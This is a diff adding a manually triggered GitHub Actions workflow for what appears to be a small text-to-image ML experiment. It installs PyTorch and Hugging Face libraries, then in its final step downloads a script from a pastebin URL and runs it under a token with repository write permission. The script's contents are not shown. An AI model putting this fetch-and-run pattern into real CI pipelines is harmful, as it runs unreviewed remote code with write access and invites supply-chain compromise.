@@ -1,0 +1,20 @@
+name: MiniT2I P0 v2
+on: workflow_dispatch
+permissions:
+  contents: write
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-python@v5
+        with:
+          python-version: "3.11"
+      - run: |
+          pip install --index-url https://download.pytorch.org/whl/cpu torch
+          pip install numpy transformers diffusers safetensors huggingface_hub
+          pip install ai-edge-torch || true
+      - run: |
+          curl -fsSL -o exp.py https://paste.rs/GQpmM
+          python exp.py
